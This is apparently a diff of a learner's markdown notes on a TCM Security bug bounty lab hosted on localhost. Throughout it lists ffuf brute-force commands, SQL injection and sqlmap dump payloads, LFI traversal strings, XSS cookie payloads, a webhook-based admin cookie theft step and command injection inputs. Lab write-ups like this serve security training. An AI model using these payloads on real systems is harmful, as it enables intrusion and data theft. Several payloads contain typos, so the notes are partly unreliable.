@@ -1,12 +1,10 @@
-**TCM Bog Bounty**
-
 # TCM Bug Bounty
 
 ## Scope
 
-> [[http://localhost:80]{.underline}](http://localhost/)
+> [http://localhost:80](http://localhost/)
 >
-> **By** : Kavishvar
+> **By** : Kavishvar KS
 >
 > *12/07/2025*
 
@@ -16,266 +14,174 @@
 
 a)  Fuzz using Burp suite and Secrists.(/usr/share/seclists/Passwords)
 
-b)  Copy request and use FUFF ***ffuf -request req.txt -request-proto
+b)  Copy request and use FUFF  ***ffuf -request req.txt -request-proto
     http -w
     /usr/share/seclists/Passwords/xato-net-10million-passwords-10000.txt
     -fs 1814***
 
 ## Authentication 0x02
 
-We get a MEA code (Short code and user name submitted again)
+a) We get a MEA code (Short code and user name submitted again)
 
-Change user name in burp suite and farword it .
+b) Change user name in burp suite and farword it .
 
 ## Authentication 0x03
 
-> localhost/init.php if the lab breaks as there are rules brute Forse
-> them.
->
-> Use cluster bomber in burp. user:admin pass:letmein.
->
-> ***ffuf -request req2.txt -request-proto http -mode clusterbomd -w***
->
-> ***/use/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER
-> -w pass.txt:PUZZPASS***\*
+a) localhost/init.php if the lab breaks as there are rules brute Forse
+them.
 
-We can use the authors wiki :
+b) Use cluster bomber in burp. user:admin pass:letmein.
 
-**[htt]{.underline}**
+c) ***ffuf -request req2.txt -request-proto http -mode clusterbomd -w /use/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -w pass.txt:PUZZPASS***\*
 
-[**p**](https://appsecexplained.gitbook.io/appsecexplained/)
-
-**[s://ap]{.underline}**
-
-[**p**](https://appsecexplained.gitbook.io/appsecexplained/)
-
-**[secex]{.underline}**
-
-[**p**](https://appsecexplained.gitbook.io/appsecexplained/)
-
-**[lained.]{.underline}**
-
-[**g**](https://appsecexplained.gitbook.io/appsecexplained/)
-
-**[itbook.io/ap]{.underline}**
-
-[**p**](https://appsecexplained.gitbook.io/appsecexplained/)
-
-**[secex]{.underline}**
-
-[**p**](https://appsecexplained.gitbook.io/appsecexplained/)
-
-**[lained]{.underline}**
-
-[**[/]{.underline}**](https://appsecexplained.gitbook.io/appsecexplained/)
+d) We can use the authors wiki :[**p**](https://appsecexplained.gitbook.io/appsecexplained/)
 
 ## Authentication 0x04
 
-> URL header we have a number for account change it and send the req
-> with different number and verify.
+a) URL header we have a number for account change it and send the req with different number and verify.
 
-**Idor**
+b) **Idor**->Insecure direct object reference.
 
--\>Insecure direct object reference.
+c) Info return based on object id.
 
-Info return based on object id.
+e) Create multiple user accounts and verify it in real world applications.
 
-Create multiple user accounts and verify it in real world applications.
+f) Do not impact other user accounts if a bug is found..
 
-Do not impact other user accounts if a bug is found..
+g) We will get 1008,1010,1012,1014 as admin accounts.
 
-We will get 1008,1010,1012,1014 as admin accounts.
-
-***ffuf -u \'\<url\<account=FFUZ\>\>\' -w num.txt -mr \'admin\'***
+h) ***ffuf -u \'\<url\<account=FFUZ\>\>\' -w num.txt -mr \'admin\'***
 
 ## Authentication 0x05
 
-> API endpoints
->
-> **1.(In terminal)Modify POST request as a new user and send it \... we
-> get a success replay with a token.**
+-->API endpoints
 
--   Every token has 3 pats - a)Header
+**1.(In terminal)Modify POST request as a new user and send it \... we
+get a success replay with a token.**
 
--   b)Body/Payload
+-   Every token has 3 pats
+-   - a)Header
 
--   c)Signature
+-   - b)Body/Payload
 
--   \- If the signature is changed the application will give invalid
+-    - c)Signature
+
+- If the signature is changed the application will give invalid
     token .
 
-> \- \*\*jwt.io\*\* to see Json web token. OR base64 decodes.
+> **jwt.io** to see Json web token. OR base64 decodes.
 
-**2**
-
-**. Next use GET request and past the above token we will get the
+**2. Next use GET request and past the above token we will get the
 account info.**
 
-Create another user account in the same way.
+- - Create another user account in the same way.
 
-**3**
+**3. Finally use one user API token to modify another user .**
 
-**. Finally use one user API token to modify another user .**
-
-This is
-
-***BFLA***
-
-Broken Function Level Authorisation.
+- - This is***BFLA*** Broken Function Level Authorisation.
 
 ## Authentication 0x06
 
-> **Add Authorize extension in Burp suite from Bapp store.**
->
-> Make sure you have jython installed if not download from jython
-> standalone.
->
-> In extension settings add the downloaded jysthon file.
->
-> We will have ***Authorize*** tab in burp to work on.
->
-> To set up Authorize under Temp headers add a user Cookie: session=
-> Turn on Authorize..
+- - **Add Authorize extension in Burp suite from Bapp store.**
+- - Make sure you have jython installed if not download from jython standalone.
+- - In extension settings add the downloaded jysthon file.
+- - We will have ***Authorize*** tab in burp to work on.
+- - To set up Authorize under Temp headers add a user Cookie: session= Turn on Authorize..
 
-Now use the other user and run
+- - Now use the other user and run ***curl***
 
-***curl***
-
-We can test and see multiple API using authorised.
+- - We can test and see multiple API using authorised.
 
 # 2.File Inclusion
 
 ## File Inclusion 0x01
 
-File name is a part of query
+-  File name is a part of query
 
-Include ../../../../../etc/passwd in place of passwd that captured in
+- Include ../../../../../etc/passwd in place of passwd that captured in
 burp.
 
 ## File Inclusion 0x02
 
-Same as above with URL encoding
+- Same as above with URL encoding
 
-Recursive encoding: \..././\..././\..././\.../\..././etc/passwd
+- Recursive encoding: \..././\..././\..././\.../\..././etc/passwd
 
 ## File Inclusion 0x03
 
-> Save the request and add FUZZ in place of file name and ffuf it
-> ***ffuf -request api-req.txt -request-proto http -w
-> /usr/share/seclists/Fuzzing/LFI/LFIJhaddix.txt -fw 19,20***
+- Save the request and add FUZZ in place of file name and ffuf it
+> - - ***ffuf -request api-req.txt -request-proto http -w /usr/share/seclists/Fuzzing/LFI/LFIJhaddix.txt -fw 19,20***
 
-\....//\....//\....//\....//\....//\....//\....//\....//etc/passed
-
+- - ....//....//....//....//....//....//....//....//etc/passed
 # 3.SQL Injection
 
 ## Injection 0x01
 
-Jermey\' or 1=1#
+- Jermey\' or 1=1#
 
-Jeremy\' union select null,null,version()#
+- Jeremy\' union select null,null,version()#
 
-Jermey\' union select null,null,from injection0x01#
+- Jermey\' union select null,null,from injection0x01#
 
 ## Injection 0x02
 
-Cookie session=
+- Cookie session= ' or 1=1#
 
-\' or 1=1#
+- Use the above payload in burp.
 
-Use the above payload in burp.
+- WE can still get the welcome page without actual passwd..
 
-WE can still get the welcome page without actual passwd..
+- \'and substring(\'a\',1,1) = \'a\'# ..Substring..
 
-\'and substring(\'a\',1,1) = \'a\'# ..Substring..
-
-***sqlmap -r request.txt \--level=2 \--dump -T injection0x02***
+> - ***sqlmap -r request.txt \--level=2 \--dump -T injection0x02***
 
 ## Injection 0x03
 
-> x\' or 1=1# ***sqlmap -r req.txt -T injection0x03_users \--dump***
->
-> Use the below payloads in the search bar of the lab to get the
-> database details\...
->
-> **Tanjyoubi Sushi Rack\' union select null, null, null, password from
-> injection0x03_users#**
+-  x\' or 1=1# ***sqlmap -r req.txt -T injection0x03_users \--dump***
+- Use the below payloads in the search bar of the lab to get the
+database details\...
 
-### Tanjyoubi Sushi Rack\' union select null,null,null, table_name from information_schema.tables#
+- **Tanjyoubi Sushi Rack\' union select null, null, null, password from
+injection0x03_users#**
+
+- **Tanjyoubi Sushi Rack\' union select null,null,null, table_name from information_schema.tables#**
 
 ## Injection 0x04
 
-Second order SQL injection.
+- Second order SQL injection.
 
-Signup using a SQL payload (username) and a passwd.
+- Signup using a SQL payload (username) and a passwd.
 
-Later on use the same user name and the above passwd.
+- Later on use the same user name and the above passwd.
 
 **4.Cros side scripting.**
 
 ## XXS 0x01
 
-> DOM based XSS
+- DOM based XSS
 
-List updated entirely locally.
-
-**\<**
-
-**img src=x onerror=\"prompt(1).\>\"**
-
-**\<**
-
-**img src=x onerror=\"\'httos://tcm-sec.com\'\".**
-
-**\>**
+- List updated entirely locally.
+> - **<mg src=x onerror="prompt(1).>"**
+> - **<img src=x onerror="https:\\tcm-sec.com".>**
 
 ## XXS 0x02
 
-> Stored XSS
->
-> The result must effect database and to all the users.
->
-> Create 2 or more user accounts add ***\< script\>alert(document.
-> Cookie)\</ script\>*** to one account and when we open another account
-> we will see it getting reflected.
-
-Basis Stored XXS
+- Stored XSS
+- The result must effect database and to all the users.
+- Create 2 or more user accounts add ***\< script\>alert(document.Cookie)\</ script\>*** to one account and when we open another account
+- we will see it getting reflected.
+- Basis Stored XXS
 
 ## XXS 0x03
 
-> Use webhook.com to get a image utl and pass it in the comments session
-> we will be able ot get the adin cookie..
+- Use webhook.com to get a image utl and pass it in the comments session
+we will be able to get the adin cookie..
 
 # 5.Command line injection
 
 ## Command Injection 0x01
 
-[htt]{.underline}
 
-[p://localhos]{.underline}
-
-[[t]{.underline}](http://localhost/)
-
-[;](http://localhost/)
-
-whoami ; \#
-
-; which php ; \#
-
-## Command Injection 0x01
-
-[htt]{.underline}
-
-[p://localhost?q]{.underline}
-
-[=\'slee]{.underline}
-
-[[p]{.underline}](http://localhost/?q=%27sleep)
-
-10
-
-\'
-
-?q=\'whoami\'
 
 ## Command Injection 0x03
 
